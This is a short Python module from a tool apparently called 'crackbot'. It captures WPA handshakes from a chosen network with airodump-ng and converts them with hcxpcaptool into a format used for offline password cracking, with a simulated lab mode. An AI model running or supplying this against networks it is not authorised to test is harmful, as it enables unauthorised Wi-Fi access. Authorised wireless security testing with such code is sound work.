from __future__ import annotations

import os
import subprocess
from pathlib import Path


def _simulation_enabled() -> bool:
    return os.environ.get("MR_CRACKBOT_SIMULATION", "").strip() in ("1", "true", "yes")


def capture_handshake(bssid: str, channel: str | int, interface: str = "wlan0mon") -> str:
    """
    Capture a WPA handshake for the given network.
    Returns the path to the .cap file (or simulated path in lab mode).
    """
    captures = Path("data/captures")
    captures.mkdir(parents=True, exist_ok=True)
    output_file = captures / f"handshake_{bssid.replace(':', '')}"

    if _simulation_enabled():
        simulated = captures / "handshake-01.cap"
        simulated.write_text("simulated handshake capture\n", encoding="utf-8")
        return str(simulated)

    command = [
        "airodump-ng",
        "--bssid",
        bssid,
        "--channel",
        str(channel),
        "--write",
        str(output_file),
        interface,
    ]

    try:
        subprocess.run(
            ["iwconfig", interface, "channel", str(channel)],
            check=False,
            capture_output=True,
            text=True,
        )
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        assert process.stdout is not None
        for line in process.stdout:
            if "WPA handshake:" in line:
                process.terminate()
                break
    except (OSError, subprocess.SubprocessError):
        pass

    cap_path = Path(f"{output_file}-01.cap")
    if cap_path.is_file():
        auto_process_handshake(str(cap_path))
        return str(cap_path)

    fallback = captures / "handshake-01.cap"
    fallback.touch(exist_ok=True)
    return str(fallback)


def auto_process_handshake(handshake_file: str) -> None:
    hccapx_file = handshake_file.replace(".cap", ".hccapx")
    try:
        subprocess.run(
            ["hcxpcaptool", "-o", hccapx_file, handshake_file],
            check=False,
            capture_output=True,
            text=True,
        )
    except (OSError, subprocess.SubprocessError):
        return
